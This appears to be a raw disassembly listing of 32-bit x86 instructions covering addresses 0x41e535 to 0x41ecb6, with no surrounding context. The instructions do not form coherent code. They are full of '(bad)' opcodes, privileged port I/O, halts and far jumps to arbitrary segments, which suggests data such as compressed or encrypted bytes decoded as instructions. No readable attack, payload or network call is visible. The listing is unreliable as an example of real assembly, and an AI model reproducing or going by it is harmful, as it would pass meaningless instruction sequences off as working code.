  41e535:	mov    ebp,esp
  41e537:	hlt    
  41e538:	and    eax,0xc037646f
  41e53d:	shr    DWORD PTR [ecx-0x31647d02],cl
  41e543:	adc    ch,BYTE PTR ds:0xed2f6455
  41e549:	clc    
  41e54a:	mov    bh,0xf7
  41e54c:	or     al,0xe6
  41e54e:	jno    0x41e552
  41e550:	pop    es
  41e551:	sbb    DWORD PTR [edx+0x24455438],edx
  41e557:	xchg   DWORD PTR [edx-0x372bee4],esi
  41e55d:	sub    al,0xfe
  41e55f:	xchg   esi,eax
  41e560:	leave  
  41e561:	mov    ebp,0xe4a7c468
  41e566:	scas   al,BYTE PTR es:[edi]
  41e567:	xchg   esp,eax
  41e568:	(bad)
  41e56c:	jmp    0x41e5e7
  41e56e:	and    bl,BYTE PTR [esi-0x7d3c017c]
  41e574:	test   eax,0x2c1fff96
  41e579:	outs   dx,DWORD PTR ss:[esi]
  41e57b:	not    BYTE PTR [ecx-0x72b3a61b]
  41e581:	jne    0x41e50c
  41e583:	or     esp,DWORD PTR ds:0x215fb99c
  41e589:	jecxz  0x41e5a7
  41e58b:	out    dx,eax
  41e58c:	mov    ecx,DWORD PTR [edx-0x215d748d]
  41e592:	pop    esi
  41e593:	ins    BYTE PTR es:[edi],dx
  41e594:	jae    0x41e5c3
  41e596:	stos   BYTE PTR es:[edi],al
  41e597:	adc    al,0x58
  41e599:	sar    DWORD PTR ds:0x8e918e6c,cl
  41e59f:	cmp    al,ah
  41e5a1:	push   ebx
  41e5a2:	mov    esp,0xab03dd2d
  41e5a7:	cmp    DWORD PTR [eax+0x70],0x7c
  41e5ab:	popf   
  41e5ac:	jmp    0x60e6:0x670ef276
  41e5b3:	jmp    0x79a3aba1
  41e5b8:	dec    ebx
  41e5b9:	jb     0x41e5ad
  41e5bb:	cmp    al,0x19
  41e5bd:	pop    ebp
  41e5be:	inc    ebp
  41e5bf:	cmp    al,0x93
  41e5c1:	cli    
  41e5c2:	rcr    DWORD PTR [eax],1
  41e5c4:	sbb    DWORD PTR [esi-0x9e524f7],0x9af61386
  41e5ce:	mov    cl,bh
  41e5d0:	mov    dl,0xc2
  41e5d2:	test   DWORD PTR [edi-0x1f],ebp
  41e5d5:	jnp    0x41e615
  41e5d7:	out    dx,al
  41e5d8:	(bad)  
  41e5d9:	loop   0x41e593
  41e5db:	push   esi
  41e5dc:	gs jecxz 0x41e63f
  41e5df:	je     0x41e590
  41e5e1:	fldenv [edi-0x32]
  41e5e4:	cmp    edx,DWORD PTR [edx-0x75a65727]
  41e5ea:	scas   eax,DWORD PTR es:[edi]
  41e5eb:	repnz inc edx
  41e5ed:	xchg   edi,eax
  41e5ee:	xor    BYTE PTR [eax],0x25
  41e5f1:	add    DWORD PTR [edi],ebp
  41e5f3:	or     BYTE PTR [esi],ah
  41e5f5:	mov    edi,0xbca5da71
  41e5fa:	pop    ecx
  41e5fb:	inc    ecx
  41e5fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5fd:	int3   
  41e5fe:	cwde   
  41e5ff:	mov    ds,WORD PTR [edx-0x4d99a768]
  41e605:	mov    ebx,0xbcaf5cb
  41e60a:	jae    0x41e688
  41e60c:	loope  0x41e652
  41e60e:	xlat   BYTE PTR ds:[ebx]
  41e60f:	fisubr WORD PTR [edi]
  41e611:	mov    dl,0xdc
  41e613:	repz pushw ss
  41e616:	add    esi,DWORD PTR [esi+0x1fdb0264]
  41e61c:	pop    esp
  41e61d:	sbb    al,0xac
  41e61f:	call   0xff61fe05
  41e624:	mov    ebp,0x3b5c99d
  41e629:	dec    edx
  41e62a:	xor    ecx,0x1d
  41e62d:	add    eax,0xda43ac5d
  41e632:	in     al,dx
  41e633:	or     eax,0x2f2c870d
  41e638:	mov    bl,BYTE PTR [ebx-0x33]
  41e63b:	xchg   edx,eax
  41e63c:	jl     0x41e67a
  41e63e:	mov    eax,0x3d9b7b80
  41e643:	mul    DWORD PTR [ebx-0x55326d1d]
  41e649:	out    dx,al
  41e64a:	inc    ecx
  41e64b:	pop    edx
  41e64c:	add    eax,DWORD PTR [edi-0x6458bd7c]
  41e652:	sub    esp,DWORD PTR [ecx-0x1d8d94f0]
  41e658:	mov    ebx,DWORD PTR [edx+0x53]
  41e65b:	addr16 inc ebp
  41e65d:	push   es
  41e65e:	dec    esi
  41e65f:	pop    esi
  41e660:	and    BYTE PTR [ebp-0x4acc1d10],0xc5
  41e667:	paddusb mm2,QWORD PTR [ebx]
  41e66a:	iret   
  41e66b:	das    
  41e66c:	adc    esp,DWORD PTR [ebx+esi*8-0x6ab85735]
  41e673:	pop    edx
  41e674:	dec    ebx
  41e675:	in     eax,dx
  41e676:	test   DWORD PTR [edx],ecx
  41e678:	xchg   ecx,eax
  41e679:	and    dl,BYTE PTR [eax+0x18f27e27]
  41e67f:	hlt    
  41e680:	push   esi
  41e681:	cmp    eax,0xaf11d68d
  41e686:	mov    ebx,0xed2403fc
  41e68b:	pop    edx
  41e68c:	stos   DWORD PTR es:[edi],eax
  41e68d:	repnz ds sbb al,dh
  41e691:	cmp    BYTE PTR [eax+0x70],al
  41e694:	lds    ecx,FWORD PTR [ebx-0x29]
  41e697:	pop    eax
  41e698:	out    0xe4,al
  41e69a:	add    DWORD PTR [eax-0x44b45fb2],edx
  41e6a0:	(bad)  [ecx+edx*1-0x756b3b3c]
  41e6a7:	xor    cl,ah
  41e6a9:	mov    ah,BYTE PTR [ecx+0x19]
  41e6ac:	sub    dl,ah
  41e6ae:	hlt    
  41e6af:	inc    ebp
  41e6b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6b1:	inc    ebx
  41e6b2:	xor    al,0x88
  41e6b4:	jnp    0x41e6fd
  41e6b6:	mov    BYTE PTR ds:0xf5004a3f,0xd1
  41e6bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6be:	mov    dl,0x45
  41e6c0:	cmp    eax,0x83f51e7f
  41e6c5:	retf   0x8915
  41e6c8:	push   ebp
  41e6c9:	xor    BYTE PTR [ebp-0x61],ah
  41e6cc:	(bad)  
  41e6cd:	mov    ebp,0xd8c3a427
  41e6d2:	jmp    0x41e6ec
  41e6d4:	lahf   
  41e6d5:	inc    esi
  41e6d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6d7:	and    ebx,DWORD PTR [edx-0x56dce843]
  41e6dd:	and    DWORD PTR [edx-0x17a4f682],ebp
  41e6e3:	sbb    eax,0x525092ed
  41e6e8:	xor    al,0xdd
  41e6ea:	out    dx,al
  41e6eb:	push   ecx
  41e6ec:	call   0xeb81:0x2dcf6753
  41e6f3:	push   ecx
  41e6f4:	push   ebp
  41e6f5:	arpl   WORD PTR ds:[ebp-0x2068451f],bp
  41e6fc:	lea    eax,[esi+0x4894755a]
  41e702:	clc    
  41e703:	xor    ch,al
  41e705:	pop    edi
  41e706:	xor    eax,0x90ab4a7b
  41e70b:	repnz rcr DWORD PTR ds:0xe510,0x88
  41e712:	dec    edx
  41e713:	loope  0x41e70c
  41e715:	dec    esi
  41e716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e717:	fidivr DWORD PTR [esp+ebx*4]
  41e71a:	pushf  
  41e71b:	sbb    al,0x1c
  41e71d:	jecxz  0x41e790
  41e71f:	jge    0x41e714
  41e721:	out    dx,al
  41e722:	xchg   esp,eax
  41e723:	in     eax,0x92
  41e725:	mov    ecx,0xde8c9bb4
  41e72a:	test   BYTE PTR [edx+0x47],ah
  41e72d:	ins    DWORD PTR es:[edi],dx
  41e72e:	jbe    0x41e713
  41e730:	loop   0x41e6f7
  41e732:	es cmp al,0x96
  41e735:	mov    dl,BYTE PTR ss:[ecx-0x60]
  41e739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e73a:	xchg   DWORD PTR ss:[edi+edx*8+0x60b8e27b],edx
  41e742:	sahf   
  41e743:	(bad)  [eax+0x9]
  41e746:	into   
  41e747:	add    DWORD PTR [bx+si+0x1c],esi
  41e74b:	je     0x41e76a
  41e74d:	mov    WORD PTR [edx],?
  41e74f:	(bad)  
  41e750:	out    dx,eax
  41e751:	or     bl,ah
  41e753:	cmp    BYTE PTR [edx-0x38fd3184],bh
  41e759:	push   ebp
  41e75a:	in     al,0x8c
  41e75c:	lods   eax,DWORD PTR ds:[esi]
  41e75d:	xchg   edi,eax
  41e75e:	push   esi
  41e75f:	sub    al,0x52
  41e761:	adc    al,0xbb
  41e763:	lods   eax,DWORD PTR ds:[esi]
  41e764:	cmp    DWORD PTR [edi+0x4b],edx
  41e767:	or     ch,BYTE PTR ds:0xc126a88d
  41e76d:	clc    
  41e76e:	add    edi,DWORD PTR [edi]
  41e770:	lds    esp,FWORD PTR [ecx+0x2554668f]
  41e776:	pushf  
  41e777:	pop    esi
  41e778:	fild   QWORD PTR [edx-0x65]
  41e77b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e77c:	lds    ecx,FWORD PTR [eax-0x2f]
  41e77f:	cmc    
  41e780:	mov    al,0x20
  41e782:	imul   ebx,DWORD PTR [ebx+0x2bbfd329],0xc7b024e1
  41e78c:	fsubp  st(1),st
  41e78e:	sti    
  41e78f:	jle    0x41e750
  41e791:	add    cl,ah
  41e793:	xchg   edi,eax
  41e794:	in     eax,dx
  41e795:	push   esp
  41e796:	fs sbb al,0x30
  41e799:	pop    ebx
  41e79a:	je     0x41e800
  41e79c:	mov    dl,0xbe
  41e79e:	std    
  41e79f:	shl    dh,cl
  41e7a1:	dec    esi
  41e7a2:	mov    esp,0x989ef227
  41e7a7:	xchg   ecx,eax
  41e7a8:	repnz mov ecx,0x17d73fda
  41e7ae:	cld    
  41e7af:	(bad)  
  41e7b1:	adc    DWORD PTR [edx+eiz*2],0x2aa036c5
  41e7b8:	jo     0x41e7e7
  41e7ba:	add    BYTE PTR [edx+0x30c111aa],bl
  41e7c0:	jo     0x41e7fd
  41e7c2:	jnp    0x41e829
  41e7c4:	je     0x41e7b5
  41e7c6:	sbb    DWORD PTR [ebx-0x2d],esi
  41e7c9:	jmp    0x41e805
  41e7cb:	aaa    
  41e7cc:	sbb    al,0x6a
  41e7ce:	mov    BYTE PTR [ebx+0x3c],dh
  41e7d1:	jg     0x41e778
  41e7d3:	retf   0xfa4b
  41e7d6:	ins    DWORD PTR es:[edi],dx
  41e7d7:	xchg   edx,eax
  41e7d8:	fld    QWORD PTR [ebp-0x3168a25e]
  41e7de:	mov    edi,0x18aa7c70
  41e7e3:	lea    esp,[edx-0x4c]
  41e7e6:	addr16 ret 
  41e7e8:	test   ah,bl
  41e7ea:	cld    
  41e7eb:	push   ebx
  41e7ec:	repz and al,0xd5
  41e7ef:	cmp    eax,DWORD PTR [eax]
  41e7f1:	into   
  41e7f2:	inc    edi
  41e7f3:	inc    esp
  41e7f4:	sbb    eax,0xa7281571
  41e7f9:	ins    DWORD PTR es:[edi],dx
  41e7fa:	add    edi,0xd3979168
  41e800:	fs xchg ecx,eax
  41e802:	push   ebp
  41e803:	adc    al,0x79
  41e805:	push   cs
  41e806:	pop    esp
  41e807:	sbb    edx,DWORD PTR [edi+0x1260a168]
  41e80d:	les    ebx,FWORD PTR [edx]
  41e80f:	(bad)  
  41e811:	loop   0x41e7cf
  41e813:	mov    DWORD PTR gs:[edx+0x585b80a8],edx
  41e81a:	cmp    esp,edx
  41e81c:	sbb    BYTE PTR [eax],dl
  41e81e:	js     0x41e82b
  41e820:	jg     0x41e838
  41e822:	add    ebx,DWORD PTR [esi-0x7fa688af]
  41e828:	sub    al,0x13
  41e82a:	pop    ecx
  41e82b:	das    
  41e82c:	mov    WORD PTR [ebx],?
  41e82e:	stos   DWORD PTR es:[edi],eax
  41e82f:	stos   BYTE PTR es:[edi],al
  41e830:	xor    al,0xb5
  41e832:	adc    al,0x1
  41e834:	loope  0x41e7f3
  41e836:	or     eax,0xff155a2b
  41e83b:	repnz add eax,0x2d5aa3e6
  41e841:	(bad)  
  41e842:	arpl   WORD PTR [ebx+ebp*8-0x77],dx
  41e846:	add    ebx,DWORD PTR [ebx-0x37]
  41e849:	adc    BYTE PTR [edi+0x2ec35b76],ah
  41e84f:	jle    0x41e7d9
  41e851:	sar    BYTE PTR [eax+ebp*2-0x4254c24],1
  41e858:	mov    ebp,0x74240be4
  41e85d:	push   edx
  41e85e:	cmp    esi,ebp
  41e860:	xor    BYTE PTR [edi+0x1903b9ab],dl
  41e866:	mov    cl,0x2b
  41e868:	das    
  41e869:	or     al,0xfd
  41e86b:	sub    DWORD PTR [esp+esi*1],ebp
  41e86e:	stc    
  41e86f:	shl    DWORD PTR [edx-0x2e7318c3],1
  41e875:	and    al,0x13
  41e877:	stos   BYTE PTR es:[edi],al
  41e878:	xchg   esp,eax
  41e879:	jno    0x41e8c4
  41e87b:	vunpckhps ymm6,ymm7,ymm4
  41e87f:	cdq    
  41e880:	dec    ebp
  41e881:	dec    ebx
  41e882:	mov    eax,ds:0x20189995
  41e887:	or     BYTE PTR [esp+ecx*2+0x5a],dl
  41e88b:	and    DWORD PTR [ebx+0x135b72dc],0xbd88559a
  41e895:	int3   
  41e896:	cmp    al,BYTE PTR [ebx]
  41e898:	pop    ebx
  41e899:	shl    eax,1
  41e89b:	cmc    
  41e89c:	les    ebp,FWORD PTR [ecx+ebp*2-0x5f9ce5c2]
  41e8a3:	push   ds
  41e8a4:	mov    eax,0x72dc6130
  41e8a9:	fimul  DWORD PTR es:[edx-0x758293]
  41e8b0:	jno    0x41e887
  41e8b2:	adc    WORD PTR [esi+0x34],sp
  41e8b6:	mov    edx,0x232099ac
  41e8bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8bc:	stc    
  41e8bd:	jl     0x41e877
  41e8bf:	jnp    0x41e933
  41e8c1:	in     al,0x75
  41e8c3:	addr16 jmp 0x345e8685
  41e8c9:	inc    ebp
  41e8ca:	fcomp  st(4)
  41e8cc:	ds pop es
  41e8ce:	cmc    
  41e8cf:	fisubr WORD PTR [edi+ebp*4]
  41e8d2:	fwait
  41e8d3:	dec    ebp
  41e8d4:	in     eax,dx
  41e8d5:	push   ebp
  41e8d6:	mov    bh,0xfb
  41e8d8:	aaa    
  41e8d9:	(bad)  
  41e8da:	jle    0x41e93a
  41e8dc:	jmp    0xbb90:0x34db8b54
  41e8e3:	lods   eax,DWORD PTR ds:[esi]
  41e8e4:	test   al,0x70
  41e8e6:	or     al,0x83
  41e8e8:	fistp  WORD PTR cs:[ecx+0x54287bb8]
  41e8ef:	xlat   BYTE PTR ds:[ebx]
  41e8f0:	pop    edi
  41e8f1:	pop    ebx
  41e8f2:	mov    ecx,0x2a8721ff
  41e8f7:	jae    0x41e8b7
  41e8f9:	scas   eax,DWORD PTR es:[edi]
  41e8fa:	rcr    DWORD PTR [ecx-0x2e],cl
  41e8fd:	out    dx,al
  41e8fe:	ds pop ss
  41e900:	dec    eax
  41e901:	dec    esp
  41e902:	(bad)  
  41e903:	mov    ebp,0xccac1554
  41e908:	push   ss
  41e909:	sbb    BYTE PTR [ecx+0x6fce060f],dl
  41e90f:	or     ah,0x7f
  41e912:	aam    0xae
  41e914:	push   ss
  41e915:	ret    
  41e916:	arpl   WORD PTR [edi],di
  41e918:	enter  0xc682,0x40
  41e91c:	or     al,0x1c
  41e91e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e91f:	(bad)  
  41e920:	into   
  41e921:	and    edx,DWORD PTR [ebx+0x4f]
  41e924:	mov    al,0x2a
  41e926:	stc    
  41e927:	push   ecx
  41e928:	mov    edx,0xdb752c95
  41e92d:	sub    al,0x53
  41e92f:	mov    ah,0x44
  41e931:	or     eax,0xf6fc96da
  41e936:	ins    DWORD PTR es:[edi],dx
  41e937:	and    al,0x86
  41e939:	adc    eax,0x294e51da
  41e93e:	jmp    0x9621bf38
  41e943:	ficomp DWORD PTR [ebp+0x11]
  41e946:	and    bh,BYTE PTR [ecx+0x1da8ccb6]
  41e94c:	push   edi
  41e94d:	mov    es,WORD PTR [ebx-0x363a5fb]
  41e953:	jg     0x41e8e4
  41e955:	dec    edi
  41e956:	ds retf 
  41e958:	inc    ebp
  41e959:	mov    al,0x7
  41e95b:	push   edx
  41e95c:	nop
  41e95d:	ret    0x8368
  41e960:	add    edi,DWORD PTR [edi+ecx*8]
  41e963:	jns    0x41e960
  41e965:	or     ebx,DWORD PTR es:[ecx-0x24]
  41e969:	(bad)  
  41e96a:	(bad)  
  41e96c:	push   ecx
  41e96d:	(bad)  
  41e96e:	jo     0x41e9cc
  41e970:	sbb    eax,0xb2a33ebf
  41e975:	and    BYTE PTR [esi+0x30bcd085],bl
  41e97b:	dec    esi
  41e97c:	push   ebp
  41e97d:	xchg   ebp,eax
  41e97e:	test   eax,0x97af120f
  41e983:	jno    0x41e9e6
  41e985:	jno    0x41e966
  41e987:	pop    ss
  41e988:	mov    dl,0x62
  41e98a:	ret    0xd51b
  41e98d:	leave  
  41e98e:	or     eax,0x240c737a
  41e993:	jo     0x41e985
  41e995:	ds sub eax,0xfe4d6cf9
  41e99b:	(bad)  
  41e99c:	mov    ebp,0x13bff269
  41e9a1:	ja     0x41e9ba
  41e9a3:	aaa    
  41e9a4:	test   al,0x6c
  41e9a6:	int3   
  41e9a7:	xor    cx,WORD PTR [ecx-0x21c59b3]
  41e9ae:	dec    ebp
  41e9af:	dec    edx
  41e9b0:	mov    ss,WORD PTR [edi+0x3fd1f498]
  41e9b6:	jle    0x41e946
  41e9b8:	gs int 0xf6
  41e9bb:	fnclex 
  41e9bd:	and    al,0x61
  41e9bf:	mov    ecx,0x299979f3
  41e9c4:	call   0xd486:0x2de01e50
  41e9cb:	sbb    eax,DWORD PTR [ecx+0x19]
  41e9ce:	test   cl,0xfd
  41e9d1:	inc    eax
  41e9d2:	jl     0x41e961
  41e9d4:	dec    DWORD PTR [esi]
  41e9d6:	mov    ebx,0x1b9e9548
  41e9db:	fdivr  DWORD PTR [esp+edi*4+0x8]
  41e9df:	lds    eax,FWORD PTR [edi]
  41e9e1:	sub    bh,cl
  41e9e3:	dec    edx
  41e9e4:	dec    ecx
  41e9e5:	sbb    al,0x8c
  41e9e7:	std    
  41e9e8:	sahf   
  41e9e9:	adc    DWORD PTR [ebx-0x666d9b20],esp
  41e9ef:	cmp    ebx,eax
  41e9f1:	nop
  41e9f2:	xchg   esi,eax
  41e9f3:	fbstp  TBYTE PTR [ecx+0x76]
  41e9f6:	push   esp
  41e9f7:	adc    DWORD PTR [ecx+0x30],0x6
  41e9fb:	pop    eax
  41e9fc:	xchg   ebp,eax
  41e9fd:	mov    eax,0xfcb5dd94
  41ea02:	in     eax,0xf9
  41ea04:	jnp    0x41e9ea
  41ea06:	inc    ebp
  41ea07:	es push ds
  41ea09:	and    esp,0x3eb98776
  41ea0f:	xchg   DWORD PTR [eax],edx
  41ea11:	pop    es
  41ea12:	xchg   esp,eax
  41ea13:	(bad)  
  41ea14:	cs shr bh,cl
  41ea17:	int    0xf2
  41ea19:	inc    esi
  41ea1a:	cmp    eax,ebp
  41ea1c:	lea    ebx,[eax+0x14]
  41ea1f:	or     dh,bl
  41ea21:	pop    es
  41ea22:	mov    ebp,0x17cd8e4c
  41ea27:	push   0xec88836
  41ea2c:	sar    esp,0x77
  41ea2f:	ret    
  41ea30:	scas   al,BYTE PTR es:[edi]
  41ea31:	mov    esp,0x74d897b2
  41ea36:	leave  
  41ea37:	(bad)  
  41ea38:	in     eax,dx
  41ea39:	jns    0x41ea3a
  41ea3b:	add    ecx,ebx
  41ea3d:	cmp    al,cl
  41ea3f:	push   es
  41ea40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea41:	sub    DWORD PTR [ebx],ecx
  41ea43:	cli    
  41ea44:	shl    dl,1
  41ea46:	jmp    0x1f46a608
  41ea4b:	jge    0x41ea83
  41ea4d:	mov    ecx,0x7cbaea95
  41ea52:	dec    BYTE PTR [ebp+0x6feec4c6]
  41ea58:	mov    ebx,0xfe11ad0
  41ea5d:	dec    ecx
  41ea5e:	mov    dh,0xc5
  41ea60:	push   ebp
  41ea61:	jae    0x41ea11
  41ea63:	scas   al,BYTE PTR es:[edi]
  41ea64:	cmp    BYTE PTR [ebx+0x61b79f0b],dh
  41ea6a:	push   edx
  41ea6b:	xor    al,0x83
  41ea6d:	jmp    0x8804f014
  41ea72:	sbb    eax,0xf04bc926
  41ea77:	std    
  41ea78:	sbb    DWORD PTR [edi-0x7732cfbd],edi
  41ea7e:	adc    ebx,DWORD PTR [ecx]
  41ea80:	jbe    0x41ea97
  41ea82:	xlat   BYTE PTR ds:[ebx]
  41ea83:	ds and ebx,ebx
  41ea86:	jmp    0x7548f49c
  41ea8b:	mov    dh,dl
  41ea8d:	dec    esp
  41ea8e:	xchg   ecx,eax
  41ea8f:	lock clc 
  41ea91:	mov    BYTE PTR [edi+ebp*8+0x42],bl
  41ea95:	movsx  di,WORD PTR ds:0xcbe7922f
  41ea9d:	out    0x8b,al
  41ea9f:	aaa    
  41eaa0:	out    dx,al
  41eaa1:	dec    ebx
  41eaa2:	(bad)  [edi]
  41eaa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaa5:	xchg   BYTE PTR [edx+0x67c61e42],bl
  41eaab:	and    DWORD PTR [ebp+0x71],esi
  41eaae:	mov    ebp,0xcb423bde
  41eab3:	out    dx,eax
  41eab4:	mov    ah,0xdf
  41eab6:	(bad)  
  41eab7:	cdq    
  41eab8:	dec    BYTE PTR [edi+ebx*4+0x26f0511]
  41eabf:	lods   al,BYTE PTR ds:[esi]
  41eac0:	and    DWORD PTR [edx-0x41],ebp
  41eac3:	cmp    BYTE PTR ds:0xcf84e584,bl
  41eac9:	scas   eax,DWORD PTR es:[edi]
  41eaca:	ss sub eax,0x3836e88c
  41ead0:	xchg   ebx,eax
  41ead1:	iret   
  41ead2:	div    DWORD PTR [ebx]
  41ead4:	xchg   esp,eax
  41ead5:	retf   0x6eee
  41ead8:	inc    esi
  41ead9:	mov    ecx,ebx
  41eadb:	xchg   dl,bl
  41eadd:	ss in  eax,0x6e
  41eae0:	dec    edi
  41eae1:	mov    ds:0x306ac084,eax
  41eae6:	sti    
  41eae7:	cmc    
  41eae8:	inc    edi
  41eae9:	xchg   ecx,eax
  41eaea:	push   ebx
  41eaeb:	xor    ebx,ebp
  41eaed:	and    ah,BYTE PTR [ecx]
  41eaef:	fs scas al,BYTE PTR es:[edi]
  41eaf1:	test   eax,0x176033eb
  41eaf6:	les    esi,FWORD PTR [ebp+0x57]
  41eaf9:	cmp    eax,0x27a83689
  41eafe:	mov    esi,DWORD PTR [edi+0x15072a98]
  41eb04:	inc    ecx
  41eb05:	xor    bl,BYTE PTR [ecx]
  41eb07:	mov    ch,0x15
  41eb09:	lods   eax,DWORD PTR ds:[esi]
  41eb0a:	and    BYTE PTR [edi+ebx*1+0x4d],bl
  41eb0e:	mov    ah,0xfc
  41eb10:	iret   
  41eb11:	sub    DWORD PTR [edx],esp
  41eb13:	cmp    esp,DWORD PTR [bp-0x3291]
  41eb18:	jl     0x41eb03
  41eb1a:	(bad)  
  41eb1b:	mov    ebx,0xe6a11b66
  41eb20:	mov    al,0xad
  41eb22:	dec    edi
  41eb23:	enter  0x9fc9,0x6c
  41eb27:	add    BYTE PTR [ebx+edi*2+0x1d5abde3],bl
  41eb2e:	retf   
  41eb2f:	xor    DWORD PTR [esi],ebp
  41eb31:	ds loope 0x41eb94
  41eb34:	ret    
  41eb35:	mov    ah,0x24
  41eb37:	adc    DWORD PTR [edx+0x25],0xffffffbb
  41eb3b:	in     eax,0x7e
  41eb3d:	iret   
  41eb3e:	dec    edx
  41eb3f:	sahf   
  41eb40:	loop   0x41eb8b
  41eb42:	mov    cl,0x35
  41eb44:	push   es
  41eb45:	push   ebp
  41eb46:	repnz cmp eax,edx
  41eb49:	dec    edi
  41eb4a:	stc    
  41eb4b:	das    
  41eb4c:	sub    DWORD PTR [eax+0x7b8cd865],edx
  41eb52:	cvtdq2ps xmm7,XMMWORD PTR [edi-0x55017f32]
  41eb59:	test   DWORD PTR [edi],ebx
  41eb5b:	out    dx,al
  41eb5c:	retf   0x8721
  41eb5f:	ds retf 
  41eb61:	jle    0x41eb70
  41eb63:	pop    ss
  41eb64:	mov    dh,0x27
  41eb66:	push   0xffffffb9
  41eb68:	rol    ecx,0xfb
  41eb6b:	loopne 0x41eb6e
  41eb6d:	inc    ebp
  41eb6e:	ja     0x41eb90
  41eb70:	fmul   st,st(3)
  41eb72:	js     0x41ebb7
  41eb74:	adc    BYTE PTR [edx-0x58d9cbe7],ah
  41eb7a:	cmp    al,0x49
  41eb7c:	mov    dl,BYTE PTR [edi+0x7c]
  41eb7f:	or     al,0xc6
  41eb81:	inc    edi
  41eb82:	xor    cl,BYTE PTR [edx]
  41eb84:	sbb    BYTE PTR [eax-0x3f94fa05],bl
  41eb8a:	mov    edi,0x14871f62
  41eb8f:	loopne 0x41eb76
  41eb91:	jp     0x41eb67
  41eb93:	mov    edx,0x6ccb511c
  41eb98:	out    dx,al
  41eb99:	aaa    
  41eb9a:	push   0xffffffe0
  41eb9c:	xchg   ebx,eax
  41eb9d:	mov    eax,0xa6835f97
  41eba2:	push   esp
  41eba3:	xchg   esp,eax
  41eba4:	in     eax,dx
  41eba5:	dec    edx
  41eba6:	leave  
  41eba7:	dec    eax
  41eba8:	xchg   edx,eax
  41eba9:	stos   BYTE PTR es:[edi],al
  41ebaa:	cld    
  41ebab:	sub    edx,DWORD PTR [ebx]
  41ebad:	loop   0x41eb94
  41ebaf:	jge    0x41ebe9
  41ebb1:	dec    eax
  41ebb3:	pop    ss
  41ebb4:	push   ds
  41ebb5:	sar    BYTE PTR [edi],cl
  41ebb7:	jecxz  0x41ebae
  41ebb9:	dec    dx
  41ebbb:	cs ins BYTE PTR es:[edi],dx
  41ebbd:	daa    
  41ebbe:	mov    edx,0xd4184852
  41ebc3:	jmp    FWORD PTR [eax+0x54]
  41ebc6:	adc    DWORD PTR [ebx+0x1e],0x41
  41ebca:	jmp    0x41ebae
  41ebcc:	ret    
  41ebcd:	and    ah,cl
  41ebcf:	lods   al,BYTE PTR ds:[esi]
  41ebd0:	adc    edi,ebp
  41ebd2:	mov    dh,0x9d
  41ebd4:	repnz sbb eax,0xd63d5ca0
  41ebda:	sar    DWORD PTR [esi-0x1f65eeda],cl
  41ebe0:	mov    al,0x87
  41ebe2:	out    dx,al
  41ebe3:	push   ebx
  41ebe4:	les    esp,FWORD PTR [edi-0x37]
  41ebe7:	arpl   WORD PTR [esi+0x27],sp
  41ebea:	pop    ebp
  41ebeb:	mov    ds:0xccc8d214,al
  41ebf0:	inc    esi
  41ebf1:	(bad)  
  41ebf2:	mov    WORD PTR [edx+0x693da2da],?
  41ebf8:	adc    eax,0xaa89cf93
  41ebfd:	sahf   
  41ebfe:	ds mov dl,0xcd
  41ec01:	shl    DWORD PTR [esi+0x50d05add],1
  41ec07:	sbb    ecx,DWORD PTR [ebx+0x44fe8ec5]
  41ec0d:	dec    ebx
  41ec0e:	cdq    
  41ec0f:	mul    DWORD PTR [ecx]
  41ec11:	lds    ebp,FWORD PTR [ecx+ebx*4-0x7a9d787]
  41ec18:	sahf   
  41ec19:	fisttp DWORD PTR [esi+edi*4-0x28a3f8e7]
  41ec20:	xor    eax,0x4bbf2e0
  41ec25:	xchg   BYTE PTR [edx-0x38],bh
  41ec28:	lods   al,BYTE PTR ds:[esi]
  41ec29:	cmp    eax,0x22151164
  41ec2e:	inc    edx
  41ec2f:	imul   esp,DWORD PTR [ecx+edi*1+0x2d2c6fc8],0xa4702d8
  41ec3a:	sbb    dl,BYTE PTR [ebp+0x2b]
  41ec3d:	dec    ecx
  41ec3e:	leave  
  41ec3f:	jo     0x41ec8a
  41ec41:	fsincos 
  41ec43:	clc    
  41ec44:	push   ebp
  41ec45:	jae    0x41ebec
  41ec47:	adc    DWORD PTR [eax+0x2b],edi
  41ec4a:	aaa    
  41ec4b:	mov    ds:0x4dc86841,al
  41ec50:	inc    edx
  41ec51:	dec    esi
  41ec52:	pushf  
  41ec53:	mov    ah,0x83
  41ec55:	cmp    DWORD PTR [edi],eax
  41ec57:	les    esp,FWORD PTR [edx-0x29]
  41ec5a:	cmp    dl,BYTE PTR [ebx+ebp*4+0x949a22f]
  41ec61:	sbb    al,0xbf
  41ec63:	test   DWORD PTR [ebx+0x17],edx
  41ec66:	inc    esp
  41ec67:	(bad)  
  41ec68:	xlat   BYTE PTR ds:[ebx]
  41ec69:	rcl    BYTE PTR [edi],cl
  41ec6b:	stos   BYTE PTR es:[edi],al
  41ec6c:	imul   edi,DWORD PTR [edx-0x1a],0xffffffc8
  41ec70:	add    eax,0xde958a55
  41ec75:	or     bl,al
  41ec77:	add    dl,al
  41ec79:	(bad)  
  41ec7a:	ja     0x41ec80
  41ec7c:	shr    DWORD PTR [eax-0x4a1c2ece],cl
  41ec82:	imul   DWORD PTR [ecx+0x3c]
  41ec85:	pop    esi
  41ec86:	leave  
  41ec87:	out    0xc4,eax
  41ec89:	sbb    BYTE PTR [esi],ah
  41ec8b:	imul   esp,DWORD PTR [edi+0x3d],0x7371711e
  41ec92:	sbb    cl,cl
  41ec94:	or     DWORD PTR ss:[ecx+0x43],0x22
  41ec99:	cwde   
  41ec9a:	pop    ebx
  41ec9b:	or     eax,0x9cc1249d
  41eca0:	inc    esp
  41eca1:	xor    al,0x18
  41eca3:	jmp    0x3937a50
  41eca8:	xchg   esi,eax
  41eca9:	cs ret 0x4fb1
  41ecad:	sbb    DWORD PTR ss:[ecx],0x9
  41ecb1:	icebp  
  41ecb2:	test   al,dl
  41ecb4:	sbb    al,0x97
  41ecb6:	mov    bh,0x5c
